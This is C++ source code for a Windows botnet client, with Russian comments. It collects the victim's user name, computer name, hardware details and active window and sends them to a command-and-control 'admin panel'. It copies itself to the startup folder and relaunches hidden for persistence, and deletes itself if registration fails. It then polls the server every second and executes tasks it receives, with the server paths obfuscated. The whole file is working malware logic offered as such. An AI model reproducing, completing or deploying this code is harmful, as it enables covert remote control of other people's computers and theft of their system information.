#include <Windows.h>
#include <wbemidl.h>
#include <ctime>
#include <comutil.h>
#include <stdint.h>

#include "Debug_to_file.h"
#include "Crypt.h"
#include "BotConfig.h"
#include "Core/Common.h"
#include "Core/core.h"

//#pragma optimize( "", off )
//#pragma comment(linker, "/SUBSYSTEM:Windows /ENTRY:Main")

#define MEM_LIMIT 1024*1024
#define MAX_MODULE_SIZE 1024*1024

static BYTE DecResponse[MEM_LIMIT];
static BYTE DecResponse_cpy[MEM_LIMIT];
static wchar_t req[1024];
static uint8_t ascii[1024*sizeof(wchar_t)];

static wchar_t botId[MAX_PATH];
static char idTask[MAX_PATH];
static int (*start_module)(wchar_t* params) = NULL;

static void install_bot() {

	wchar_t path_newbot[1024];
	wchar_t path_bot[1024];
	wchar_t cmdParametrs[MAX_PATH];

	SHGetFolderPathW(NULL, CSIDL_ALTSTARTUP, NULL, 0, path_newbot);
	GetModuleFileNameW(NULL, path_bot, sizeof(path_bot) / sizeof(path_bot[0]));
	wcscat(path_newbot, L"\\bot.exe");
	//если пути ботов - того который должен быть установлен и того кто запустился не совпадают

		//копирование бота в папку автозагрузки
	if (CopyFileW(path_bot, path_newbot, TRUE))
	{
		wchar_t cmd_path[MAX_PATH];
		GetEnvironmentVariableW(L"COMSPEC", cmd_path, MAX_PATH);
		wsprintfW(cmdParametrs, L"/c \"%ls\"", path_newbot);
		SHELLEXECUTEINFO sei;
		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = L"Open";
		sei.lpFile = cmd_path;
		sei.lpParameters = cmdParametrs;
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
		if (ShellExecuteEx(&sei))
		{
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS); //removing process stops
			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //accelerate our process
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //accelerate our thread
		}
		do_destroy();
	}
		//выполняем самоудаление в любом случае, можно придумать альтернативы
	
}

int main()
{	
	start_bot(botId);

	//Получение данных для регистрации бота в админке
	GetBotId(botId);

	DWORD majorVer, minorVer, buildVer;
	GetWinVer(&majorVer, &minorVer, &buildVer);

	wchar_t userName[MAX_PATH];
	if (!GetUsernameW(userName))
	{
		API(USER32, wsprintfW)(userName, L"void");
	}

	wchar_t computerName[MAX_PATH];
	if (!GetComputernameW(computerName))
	{
		API(USER32, wsprintfW)(computerName, L"void");
	}

	wchar_t cpuName[MAX_PATH];
	GetCpuName(cpuName);

	wchar_t gpuName[MAX_PATH];
	GetGpuName(gpuName);

	DWORD aviableRam;
	GetAviableRam(&aviableRam);

	wchar_t screenResolution[MAX_PATH];
	GetScreenResolution(screenResolution);

	wchar_t activeWindow[MAX_PATH];
	GetActiveWindow(activeWindow);

	//Генерация строки для отправки
	API(USER32, wsprintfW)(req, L"%s|Win %d.%d %d|%s|%s|%s|%s|%d|%s|%s",
		botId, majorVer, minorVer, buildVer, userName, computerName, cpuName, gpuName, aviableRam, screenResolution, activeWindow);

	UnicodeToASCII(req, (char*)ascii);

	//Попытка регистрации бота в админке
	bool ret_code = bot_reg(req);
	if (ret_code == true) {
		DEBUG_TO_FILE("+++ Bot is reg id: %s \r\n", botId);
		install_bot();
	}
	else {
		//Невозможно зарегистрировать бота, нужно самоудалиться
		DEBUG_TO_FILE("+++ Bot is reg fault id: %s \r\n", botId);
		do_destroy();
	}

	BYTE* recv_code = NULL;
	//Тут бесконечный цикл с опросом /gate/ping раз в секунду
	while (1) {
		//Задержка секунду.
		Sleep(1000);
		//Формирование запроса на ping
		API(USER32, wsprintfW)(req, L"%s|", botId);
		//Посылка запроса

		ret_code = post_send_recv_bot
		(hide_admin_path(),
		 hide_ping_path(),
		(wchar_t*)req,
		DecResponse);
		if (ret_code == true) {
			strncpy((char*)DecResponse_cpy, (const char*)DecResponse, sizeof(DecResponse));
			recv_code = (BYTE*)strtok((char*)DecResponse_cpy, "|");
			if (recv_code != NULL) {
				//Парсинг результатов
				if (!strcmp((const char*)recv_code, hide_str_reg())) {
					//Пройти регистрацию еще раз
					API(USER32, wsprintfW)(req, L"%s|Win %d.%d %d|%s|%s|%s|%s|%d|%s|%s",
						botId, majorVer, minorVer, buildVer, userName, computerName, cpuName, gpuName, aviableRam, screenResolution, activeWindow);
					UnicodeToASCII(req, (char*)ascii);
					DEBUG_TO_FILE("+++ Start reg bot again: %s \r\n", ascii);
					//Попытка регистрации бота в админке еще раз
					bot_reg(req);
				}
				else {
					if (!strcmp((const char*)recv_code, hide_str_task())) {
						//Выполнить задание
						parse_task_and_exec(botId, (char*)DecResponse);
					}
				}
			}
			DEBUG_TO_FILE("+++ Bot is worked ID: %s \r\n", botId);
		}
	}
	return 0;
}